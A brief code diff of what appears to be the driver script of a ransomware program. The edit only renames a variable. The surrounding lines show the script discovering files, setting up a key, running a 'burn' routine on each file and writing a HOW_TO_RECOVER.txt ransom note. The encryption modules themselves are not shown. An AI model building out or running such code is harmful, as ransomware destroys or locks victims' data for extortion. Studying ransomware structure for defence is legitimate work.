@@ -2,11 +2,11 @@ import discover
 import burn
 import seal
 
-archivos=discover.find_files()
-print(archivos)
+files=discover.find_files()
+print(files)
 seal.non_volatile_key()
 
-for item in archivos:
+for item in files:
     burn.main(item)
 
 with open("HOW_TO_RECOVER.txt",'w') as file:
